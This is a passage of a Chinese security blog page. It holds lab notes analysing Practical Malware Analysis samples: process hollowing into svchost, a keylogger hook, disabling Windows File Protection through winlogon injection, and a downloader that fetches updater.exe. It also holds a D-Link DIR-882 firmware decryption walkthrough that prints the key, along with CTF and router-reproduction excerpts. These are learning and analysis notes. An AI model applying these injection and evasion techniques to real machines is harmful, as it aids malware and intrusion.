<p><img src="/2021/03/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98lab%E8%AE%B0%E5%BD%95/image-20210321201430999.png" alt="image-20210321201430999"></p>
<ul>
<li>获取当前模块句柄，调用函数<code>sub_40149D</code>，得到\svchost.exe的绝对路径</li>
<li>调用<code>sub_40132C</code>函数，参数为之前获得的句柄，进入查看</li>
</ul>
<p><img src="/2021/03/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98lab%E8%AE%B0%E5%BD%95/image-20210321202033984.png" alt="image-20210321202033984"></p>
<ul>
<li>将资源节的数据加载到新分配的内存区，经过一系列操作后，需要调用函数<code>sub_401000</code>，该函数会对载入的内存区和65进行异或操作，推测为<strong>解密函数</strong>，最后会将解密得到的地址的头部返回给主函数</li>
<li>回到主函数，调用<code>sub_4010EA</code>函数，参数为此前获得的头部路径和解密数据的地址头部，进入查看</li>
</ul>
<p><img src="/2021/03/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98lab%E8%AE%B0%E5%BD%95/image-20210321202933204.png" alt="image-20210321202933204"></p>
<ul>
<li>开头会对解密数据进行校验并进行初始化工作，然后调用<code>CreateProcessA</code>函数启动<code>svchost.exe</code>进程，注意其参数设置使其以<strong>挂起状态</strong>启动</li>
<li>申请内存空间，获取线程上下文</li>
</ul>
<p><img src="/2021/03/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98lab%E8%AE%B0%E5%BD%95/image-20210321203628272.png" alt="image-20210321203628272"></p>
<ul>
<li>获取进程上下文，并获取<code>ntdll.dll.NtUnmapViewOfSection</code>函数地址</li>
<li>调用<code>NtUnmapViewOfSection</code>函数释放掉新创建的进程的空间，用以填充恶意代码</li>
<li>调用<code>VirtualAllocEx</code>函数在挂起的进程中分配内存，调用<code>WriteProcessMemory</code>函数向该进程内写入数据，注意写入分多次，先写入头部，再循环写入各节，最后写入尾部</li>
<li>调整之前保存的线程上下文，并设置到当前线程</li>
</ul>
<p>exe文件分析结束，分析加密数据</p>
<ul>
<li><p>使用Resource Hacker提取资源节为二进制文件</p>
</li>
<li><p>使用winhex，在其中修改数据，选择xor 41，结果如下，为明显的PE文件，用来替换svchost.exe，将修改后的数据另存为</p>
<p><img src="/2021/03/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98lab%E8%AE%B0%E5%BD%95/image-20210321211128337.png" alt="image-20210321211128337"></p>
</li>
<li><p>进入IDA查看保存的文件，其main函数如下</p>
</li>
</ul>
<p><img src="/2021/03/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98lab%E8%AE%B0%E5%BD%95/image-20210321211335100.png" alt="image-20210321211335100"></p>
<ul>
<li>调用<code>AllocConsole</code>函数为进程分配一个控制台，并获取句柄，设置控制台窗口状态位隐藏窗口</li>
<li>调用函数<code>SetWindowsHookExA</code>，设置一个全局钩子，指向<code>fn</code>函数，第一个参数设置为13，表示对<strong>底层键盘输入</strong>事件进行监视，查看<code>fn</code>函数</li>
</ul>
<p><img src="/2021/03/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98lab%E8%AE%B0%E5%BD%95/image-20210322134808026.png" alt="image-20210322134808026"></p>
<ul>
<li>可以看到其调用了<code>sub_4010C7</code>函数，该函数虽然长，但结构比较清晰，功能为将部分键盘输入保存到<code>practicalmalwareanalysis.log</code>文件中</li>
</ul>
<h4 id="问题-4"><a href="#问题-4" class="headerlink" title="问题"></a>问题</h4><ul>
<li><p>程序的目的是什么</p>
<p>启动并替换svchost.exe进程，启动恶意代码</p>
</li>
<li><p>启动器恶意代码是如何隐蔽执行的</p>
<p>替换svcHost.exe进程，获取其权限</p>
</li>
<li><p>恶意代码的负载存储在哪里</p>
<p>被加密后资源节</p>
</li>
<li><p>恶意负载是如何被保护的</p>
<p>对恶意负载进行了简单异或加密，进程替换时会进行解密</p>
</li>
<li><p>字符串列表是如何被保护的</p>
</li>
</ul>
<h3 id="12-3"><a href="#12-3" class="headerlink" title="12-3"></a>12-3</h3><p>居然就是12-2提取出来的文件</p>
<h3 id="12-4"><a href="#12-4" class="headerlink" title="12-4"></a>12-4</h3><p>IDA查看主函数</p>
<p><img src="/2021/03/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98lab%E8%AE%B0%E5%BD%95/image-20210322200407794.png" alt="image-20210322200407794"></p>
<ul>
<li>载入三个函数</li>
<li>调用<code>EnumProcesses</code>函数枚举进程</li>
<li>对于每一个进程，调用函数<code>sub_401000</code>，该函数会将获取的进程名称与winlogon.exe比较，如果是则返回1，可见该循环的作用是查找winlogon.exe的PID</li>
<li>找到之后，调用函数<code>sub_401174</code></li>
</ul>
<p><img src="/2021/03/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98lab%E8%AE%B0%E5%BD%95/image-20210322202436196.png" alt="image-20210322202436196"></p>
<ul>
<li>该函数首先调用<code>sub_4010FC</code>函数，该函数为提权操作</li>
<li>获取<code>sfc_os.dll</code>中编号为2的函数地址，保存到lpStartAddress。经查询，该函数为<code>SfcTerminateWatcherThread</code>，可以禁用windows文件保护机制</li>
<li>在winlogon.exe进程中创建远程线程，实现该函数的进程注入</li>
<li>回到主函数</li>
</ul>
<p><img src="/2021/03/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98lab%E8%AE%B0%E5%BD%95/image-20210322202953340.png" alt="image-20210322202953340"></p>
<ul>
<li>获取当前目录，与\system32\wupdmgr.exe拼接，保存到ExistingFileName</li>
<li>获取临时路径，与\winup.exe拼接，保存到NewFileName</li>
<li>调用<code>MoveFile</code>函数将wupdmgr.exe复制为winup.exe</li>
<li>调用函数<code>sub_4011FC</code>，进入查看</li>
</ul>
<p><img src="/2021/03/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98lab%E8%AE%B0%E5%BD%95/image-20210322203417787.png" alt="image-20210322203417787"></p>
<ul>
<li>调用函数<code>FindResourceA</code>，提取Bin #101资源节</li>
<li>将提取文件写入\system32\wupdmgr.exe，调用<code>WinExec</code>函数执行</li>
</ul>
<p>exe文件解析完毕，接下来用Resource Hacker提取资源节，获取到可执行文件4.exe，进入IDA分析</p>
<p><img src="/2021/03/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98lab%E8%AE%B0%E5%BD%95/image-20210322204311784.png" alt="image-20210322204311784"></p>
<ul>
<li>调用函数<code>URLDownloadToFileA</code>，从<a target="_blank" rel="noopener" href="http://www.practicalmalwareanalysis.com/updater.exe%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E4%BF%9D%E5%AD%98%E5%88%B0%E6%8C%87%E5%AE%9A%E8%B7%AF%E5%BE%84%EF%BC%8C%E4%B8%8B%E8%BD%BD%E5%AE%8C%E6%88%90%E5%90%8E%E6%89%A7%E8%A1%8C%E4%B8%8B%E8%BD%BD%E7%9A%84%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81">http://www.practicalmalwareanalysis.com/updater.exe下载文件保存到指定路径，下载完成后执行下载的恶意代码</a></li>
</ul>
<h2 id="ch14"><a href="#ch14" class="headerlink" title="ch14"></a>ch14</h2><h3 id="14-1"><a href="#14-1" class="headerlink" title="14-1"></a>14-1</h3><p>IDA分析exe程序，main函数如下所示</p>
<p><img src="/2021/03/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98lab%E8%AE%B0%E5%BD%95/image-20210323085400136.png" alt="image-20210323085400136"></p>
<ul>
<li>调用函数<code>GetCurrentHwProfileA</code>获取硬件配置信息</li>
<li>将用户名和硬件配置信息写入Str，作为参数调用函数<code>sub_4010BB</code>，经分析发现该函数调用的函数<code>sub_401000</code>中使用了base字段，推测该函数为base加密函数，加密结果保存到v9</li>
<li>调用函数<code>sub_4011A3</code>，进入查看</li>
</ul>
<p><img src="/2021/03/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98lab%E8%AE%B0%E5%BD%95/image-20210323090404872.png" alt="image-20210323090404872"></p>
<ul>
<li>该函数会拼接一个url字段，显然这是一个文件，并调用函数<code>URLDownloadToCacheFileA</code>对该文件进行下载</li>
<li>运行下载后的文件</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/02/24/HWS%E8%B7%AF%E7%94%B1%E5%99%A8%E5%AE%9E%E9%AA%8C/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="青晷">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2021/02/24/HWS%E8%B7%AF%E7%94%B1%E5%99%A8%E5%AE%9E%E9%AA%8C/" itemprop="url">HWS路由器实验</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-02-24T10:19:40+08:00">
                2021-02-24
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="固件解密"><a href="#固件解密" class="headerlink" title="固件解密"></a>固件解密</h2><p>D-Link Dir-882固件</p>
<p>对于固件v1.20b06，binwalk无法探测，可以考虑分析旧版本固件尝试解密新版本固件</p>
<p>找到固件v1.10b02 ，是过渡版本，其中有文件<code>DIR882A1_FW104B02_Middle_FW_Unencrypt.bin</code>，是未加密的，使用binwalk探测</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ binwalk DIR882A1_FW104B02_Middle_FW_Unencrypt.bin</span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             uImage header, header size: 64 bytes, header CRC: 0x50982AB1, created: 2018-03-11 13:18:48, image size: 13265102 bytes, Data Address: 0x81001000, Entry Point: 0x816118E0, data CRC: 0x3A2AC829, OS: Linux, CPU: MIPS, image <span class="built_in">type</span>: OS Kernel Image, compression <span class="built_in">type</span>: lzma, image name: <span class="string">&quot;Linux Kernel Image&quot;</span></span><br><span class="line">160           0xA0            LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, uncompressed size: 18684352 bytes</span><br></pre></td></tr></table></figure>

<p>使用binwalk提取</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ binwalk -Me DIR882A1_FW104B02_Middle_FW_Unencrypt.bin</span><br></pre></td></tr></table></figure>

<p>在多层提取后可以找到文件夹<code>cpio-root</code>，</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">/cpio-root$ ls</span><br><span class="line">bin  etc     home  lib    mnt      proc  share  tmp  var</span><br><span class="line">dev  etc_ro  init  media  private  sbin  sys    usr</span><br><span class="line">/cpio-root$ <span class="built_in">cd</span> bin</span><br><span class="line">/cpio-root/bin$ ls</span><br><span class="line">ac          egrep         ip         ls            nvram_set    routel</span><br><span class="line">acl         eth_mac       ip6tables  mii_mgr       openssl      rt2860apd</span><br><span class="line">ash         fgrep         ipaddr     mii_mgr_cl45  pcmcmd       rtinicapd</span><br><span class="line">ated        flash         iplink     miniupnpd     ping         sed</span><br><span class="line">bndstrg     gpio          iproute    mkdir         ping6        sh</span><br><span class="line">busybox     grep          iprule     mknod         prog-cgi     sleep</span><br><span class="line">cat         hostname      iptables   mount         prog.cgi     spdifcmd</span><br><span class="line">chmod       hw_nat        iptunnel   mpstat        protest      switch</span><br><span class="line">cp          i2ccmd        iwconfig   mtd_write     ps           tc</span><br><span class="line">date        i2scmd        iwpriv     mtr           <span class="built_in">pwd</span>          touch</span><br><span class="line">dd          igmpproxy     <span class="built_in">kill</span>       mv            qos_run      umount</span><br><span class="line">dmesg       igmpproxy.sh  lighttpd   netstat       ralink_init  uname</span><br><span class="line">dnsmasq     imgdecrypt    lld2d      ntpclient     rc           vi</span><br><span class="line">dumpleases  inadyn-mt     ln         nvram_daemon  reg          web</span><br><span class="line"><span class="built_in">echo</span>        init_system   login      nvram_get     rm           wsc_monitor.sh</span><br></pre></td></tr></table></figure>

<p>可以找到文件<code>imgdecrypt</code>，推测为固件解密文件，使用qemu模拟运行</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ qemu-mipsel-static -L .. imgdecrypt </span><br><span class="line">imgdecrypt &lt;sourceFile&gt;</span><br></pre></td></tr></table></figure>

<p>将新版本固件复制到该目录下解密，然后就可以用binwalk对新版本固件提取</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ qemu-mipsel-static -L .. imgdecrypt DIR_882_FW120B06.BIN</span><br><span class="line">key:C05FBF1936C99429CE2A0781F08D6AD8</span><br></pre></td></tr></table></figure>


          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/02/20/HWS2021%E5%86%AC%E4%BB%A4%E8%90%A5%E9%80%89%E6%8B%94%E8%B5%9B/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="青晷">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2021/02/20/HWS2021%E5%86%AC%E4%BB%A4%E8%90%A5%E9%80%89%E6%8B%94%E8%B5%9B/" itemprop="url">HWS2021冬令营选拔赛</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-02-20T14:14:25+08:00">
                2021-02-20
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="emarm"><a href="#emarm" class="headerlink" title="emarm"></a>emarm</h2><p>首先检查一下文件，是arm框架64位程序，动态链接</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ file emarm</span><br><span class="line">emarm: ELF 64-bit LSB executable, ARM aarch64, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux-aarch64.so.1, <span class="keyword">for</span> GNU/Linux 3.7.0, BuildID[sha1]=f5ece0eeec2355ab7660bb15b664dc68e585e62c, stripped</span><br><span class="line"></span><br><span class="line">$ checksec emarm</span><br><span class="line">[*] <span class="string">&#x27;/home/ssr/iot/hws-2021-select/emarm/emarm&#x27;</span></span><br><span class="line">    Arch:     aarch64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<p>开始测试程序前需要配置一下环境，此前安装<code>qemu</code>和<code>patchelf</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ln -s `<span class="built_in">pwd</span>`/ld-linux-aarch64.so.1 /lib/ld-linux-aarch64.so.1</span><br><span class="line">patchelf --replace-needed libc.so.6 `<span class="built_in">pwd</span>`/libc.so.6 <span class="variable">$elf</span></span><br></pre></td></tr></table></figure>


          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://example.com/2020/12/29/Arm-%E5%85%A5%E9%97%A8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="青晷">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/12/29/Arm-%E5%85%A5%E9%97%A8/" itemprop="url">ARM-入门</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-12-29T19:41:15+08:00">
                2020-12-29
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          <p><strong>要逆向一个arm框架的板子，在开始动手前先熟悉一下arm相关基础</strong></p>
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2020/12/29/Arm-%E5%85%A5%E9%97%A8/#more" rel="contents">
              阅读全文 &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://example.com/2020/12/26/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IoT%E9%97%AF%E5%85%B3%E8%B5%9Bpwn%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="青晷">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/12/26/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IoT%E9%97%AF%E5%85%B3%E8%B5%9Bpwn%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" itemprop="url">西湖论剑IoT闯关赛pwn漏洞复现</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-12-26T21:00:43+08:00">
                2020-12-26
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          <p>这次是arm框架的IoT设备，参照学长博客开始复现漏洞</p>
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2020/12/26/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IoT%E9%97%AF%E5%85%B3%E8%B5%9Bpwn%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/#more" rel="contents">
              阅读全文 &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://example.com/2020/12/22/pwn%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%9D%E6%AD%A5%E5%AD%A6%E4%B9%A0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="青晷">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/12/22/pwn%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%9D%E6%AD%A5%E5%AD%A6%E4%B9%A0/" itemprop="url">pwn格式化字符串漏洞的初步学习</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-12-22T21:11:00+08:00">
                2020-12-22
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          <p>逆向学了一部分还需要学更多pwn的内容，所以继续往下学</p>
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2020/12/22/pwn%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%9D%E6%AD%A5%E5%AD%A6%E4%B9%A0/#more" rel="contents">
              阅读全文 &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://example.com/2020/12/17/%E7%A5%A5%E4%BA%91%E6%9D%AFre-writeup/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="青晷">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/12/17/%E7%A5%A5%E4%BA%91%E6%9D%AFre-writeup/" itemprop="url">祥云杯re-writeup</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-12-17T20:18:03+08:00">
                2020-12-17
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          <p>祥云杯比赛那天没来得及参加，只能事后补补，先做做re，如果有时间看看pwn</p>
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2020/12/17/%E7%A5%A5%E4%BA%91%E6%9D%AFre-writeup/#more" rel="contents">
              阅读全文 &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://example.com/2020/11/28/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-%E6%80%9D%E7%A7%91%E8%B7%AF%E7%94%B1%E5%99%A8RV110W/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="青晷">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/11/28/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-%E6%80%9D%E7%A7%91%E8%B7%AF%E7%94%B1%E5%99%A8RV110W/" itemprop="url">漏洞复现--思科路由器RV110W</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-11-28T14:47:28+08:00">
                2020-11-28
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <a id="more"></a>

<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>使用<code>nmap</code>扫描其常用端口</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ssr@ubuntu:~$ nmap 192.168.1.1</span><br><span class="line">Starting Nmap 7.01 ( https://nmap.org ) at 2020-11-30 05:10 PST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.1</span><br><span class="line">Host is up (0.0065s latency).</span><br><span class="line">Not shown: 994 filtered ports</span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">23/tcp  open  telnet</span><br><span class="line">25/tcp  open  smtp</span><br><span class="line">80/tcp  open  http</span><br><span class="line">110/tcp open  pop3</span><br><span class="line">443/tcp open  https</span><br><span class="line">444/tcp open  snpp</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 22.88 seconds</span><br></pre></td></tr></table></figure>

<p>发现在23端口为telnet，80端口为http，然后用<code>curl -v</code>输出与80端口通信的过程，发现其被重定位到了https即443端口</p>
